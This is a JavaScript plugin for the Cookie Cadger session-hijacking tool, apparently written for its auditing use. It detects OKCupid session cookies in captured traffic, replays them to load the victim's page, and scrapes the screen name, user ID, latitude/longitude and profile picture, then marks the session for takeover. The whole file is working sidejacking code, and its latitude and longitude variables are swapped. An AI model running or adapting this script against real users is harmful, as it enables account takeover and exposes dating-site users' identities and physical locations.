importPackage(Packages.com.cookiecadger);

var description;
var profileImageUrl;
var sessionUri;

function processRequest(host, uri, userAgent, accept, cookies)
{
	description = null;
	profileImageUrl = null;
	sessionUri = null;

	// OKCupid uses a "session" variable in authenticated cookies
	if(host.indexOf("okcupid") != -1 && cookies.indexOf("session=") != -1)
	{
		try {
			// okcupid doesn't have API support so, getting some information will depend on the page we are on
			var pageContent = Packages.com.cookiecadger.Utils.readUrl("http://" + host + uri, userAgent, accept, cookies);

			// some data is handily provide as javascript variables on what seems like is every page...
			var currentUserID = pageContent.substring(pageContent.indexOf("CURRENTUSERID = \"") + 17, pageContent.length());
			currentUserID = currentUserID.substring(0, currentUserID.indexOf("\";"));

			var currentScreenname = pageContent.substring(pageContent.indexOf("SCREENNAME = \"") + 14, pageContent.length());
			currentScreenname = currentScreenname.substring(0, currentScreenname.indexOf("\";"));

			var lat = pageContent.substring(pageContent.indexOf("USER_LON = parseFloat(\"") + 23, pageContent.length());
			lat = lat.substring(0, lat.indexOf("\");"));

			var lng = pageContent.substring(pageContent.indexOf("USER_LAT = parseFloat(\"") + 23, pageContent.length());
			lng = lng.substring(0, lng.indexOf("\");"));

			// support for the home page, and some other pages
			try {
				// profile icon is in the leftside bar
				var profilePic = pageContent.substring(pageContent.indexOf("leftbar_thumb"), pageContent.length());
				profileImageUrl = "" + profilePic.substring(profilePic.indexOf("<img src=\"") + 10, profilePic.indexOf("\" border="));
			} catch (err1){
				profileImageUrl = null;
			}
			
			description = "<html><font size=5>OKCupid</font><br>User: " + currentScreenname + "<br>ID: " + currentUserID + "<br>Lat/Lng: " + lat + ", " + lng;
			sessionUri = "/home";
		} catch (err2){
			// maybe not a valid session
			description = null;
			profileImageUrl = null;
			sessionUri = null;
		}
	}
}
